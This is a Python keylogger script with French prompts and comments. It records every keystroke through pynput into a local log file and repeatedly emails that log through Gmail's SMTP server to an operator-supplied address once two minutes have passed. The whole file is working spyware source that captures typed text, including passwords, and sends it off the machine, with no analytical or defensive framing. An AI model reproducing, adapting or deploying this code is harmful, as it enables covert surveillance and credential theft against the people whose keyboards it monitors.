#!/usr/bin/python
from pynput.keyboard import Key, Listener
from email.message import EmailMessage 
from datetime import datetime
import smtplib
import time
import getpass

email = input("vuillez entrer une adresse email: ")
email = str(email)

password =getpass.getpass(prompt='-> mot de passe: ',stream=None)
password = str(password)

with open ("log.txt","a") as file:
    now = datetime.now()
    now = now.strftime("%d-%m-%Y %H:%M:%S")
    file.write("\n"+now+"--------------------------------------------------------------------"+"\n")

class Keylogger:

    def __init__(self):
        self.start_time = time.time()
        self.shift = False
        self.caps= False
        

    def send_email(slef):
        with open("log.txt","r") as file:
            data = file.read()      

        server = smtplib.SMTP('smtp.googlemail.com',587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(email,password)

        email_message = EmailMessage()
        email_message["subject"] = "monitoring de clavier"
        email_message["From"] = email
        email_message["To"] = email
        email_message.set_content(str(data))

        server.send_message(email_message)
        server.quit()

    def write_key(self,key):
        with open("log.txt","a") as file:

            if time.time() - self.start_time > 120 :  #chaque deux minute envoi un mail 
                self.send_email()

            if key == Key.enter:
                file.write("\n")

            elif key == Key.space:
                file.write(" ")

            elif key == Key.backspace :

                U = open("log.txt","rt")
                ligne = U.readlines()
                G = str(ligne[-1])
                G = G[:-1]
                ligne[-1] = G
                open("log.txt","wt").writelines(ligne)     
            
            elif key == Key.shift:
                if not self.shift:
                    self.shift = True    

            elif key == Key.caps_lock:
                if not self.caps:
                    self.caps = True     
                else:
                    self.caps = False    

            else:
                try:
                    if key.char.isalpha():
                        if self.caps or self.shift:           
                            file.write(key.char.upper())
                        else:
                            file.write(key.char)
                    
                    else:
                        file.write(key.char)
                except:

                    pass         

    def check_shift(self, key):
        if key == Key.shift:
            self.shift = False       


keylogger = Keylogger()

with Listener(on_press=keylogger.write_key, on_release=keylogger.check_shift) as listener:
    listener.join()
